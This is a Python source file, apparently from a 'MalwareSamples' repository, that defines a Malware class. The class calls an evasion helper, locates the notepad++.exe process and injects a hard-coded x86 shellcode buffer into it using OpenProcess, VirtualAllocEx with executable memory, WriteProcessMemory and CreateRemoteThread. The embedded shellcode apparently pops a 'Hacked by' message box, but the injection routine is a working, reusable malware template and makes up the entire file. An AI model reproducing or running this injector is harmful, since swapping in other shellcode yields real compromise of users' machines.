"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   Malware_MK1.py
   ---

   REFERENCES
   https://stackoverflow.com/questions/6980246/how-can-i-find-a-process-by-name-and-kill-using-ctypes
   https://thispointer.com/python-check-if-a-process-is-running-by-name-and-find-its-process-id-pid/

"""
from ctypes import *
import ctypes.wintypes
import psutil
from helpers import evasion


class Malware:
    def __init__(self):

        evasion()

        self.buf = b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c" \
                   b"\x8b\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b" \
                   b"\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee" \
                   b"\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b" \
                   b"\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3" \
                   b"\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e" \
                   b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e" \
                   b"\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2" \
                   b"\x4d\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67\x65\x42\x68\x4d\x65" \
                   b"\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3\x68\x63\x6b\x58\x20\x68\x79\x20\x4a\x61\x68\x65\x64\x20" \
                   b"\x62\x68\x48\x61\x63\x6b\x31\xc9\x88\x4c\x24\x0e\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0" \
                   b"\x50\xff\x55\x08"
        self.process_name = "notepad++.exe"
        self.pid = self.findProcessIdByName()
        self.inject()



    def inject(self):

        page_rwx_value = 0x40
        process_all = 0x1F0FFF
        memcommit = 0x00001000
        kernel32_variable = windll.kernel32

        shellcode_length = len(self.buf)

        process_handle = kernel32_variable.OpenProcess(process_all, False, self.pid)
        memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit,
                                                                      page_rwx_value)
        kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, self.buf, shellcode_length, 0)
        kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)



    def findProcessIdByName(self):
        '''
        Get a list of all the PIDs of a all the running process whose name contains
        the given string processName
        '''

        # Iterate over the all the running process
        for proc in psutil.process_iter():
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name', 'create_time'])
                # Check if process name contains the given name string.
                if self.process_name.lower() in pinfo['name'].lower():
                    return pinfo['pid']
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass





if __name__ == "__main__":
    Malware()